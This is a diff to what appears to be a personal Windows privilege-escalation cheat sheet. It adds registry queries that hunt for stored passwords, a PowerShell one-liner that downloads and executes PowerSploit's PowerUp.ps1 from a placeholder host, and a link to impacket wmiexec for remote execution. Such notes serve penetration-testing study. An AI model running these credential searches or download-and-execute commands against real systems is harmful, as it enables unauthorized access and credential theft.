@@ -109,6 +109,12 @@ Check if Windows version has any known vulnerability (also check the patches app
 		Get-HotFix | ft -AutoSize
 		Get-Hotfix -description "Security update" #List only "Security Update" patches
 
+
+## Search for passwords
+
+	reg query HKLM /f password /t REG_SZ /s
+	reg query HKCU /f password /t REG_SZ /s
+
 ## Check communication through processess using pipes
 
 	pipelist.exe /accepteula		enumerate instances of named pipes
@@ -117,6 +123,11 @@ Check if Windows version has any known vulnerability (also check the patches app
 	accesschk.exe /accepteula \\.\Pipe\<name_of_pipe> -v		Enumerate permissions of pipe. We are looking for a pipe we have WRITE permissions for our user
 		https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk
 	accesschk.exe -w \pipe\* -v		Enumerates all pipes that have WRITE permission
+	Use powersploit powerup to check miss configurations
+		https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
+		IEX(New-Object Net-WebClient).downloadString("http://myhostwiththescript/PowerUp.ps1")
+		Then run is ps:
+		Invoke-AllChecks
 
 
 ## Check weak permission
@@ -138,6 +149,10 @@ Check if Windows version has any known vulnerability (also check the patches app
 We can try doing remote logins with useranmes and passwords using a script from impacket
 
 	psexec.py '<username>:<password>@<remote_host_ip>'
+
+Use impacket-wmiexec with rpc port 135:
+
+	https://github.com/Andre92Marcos/tools/blob/master/impacket/wmiexec.md
 
 
 ## Try WinPeas
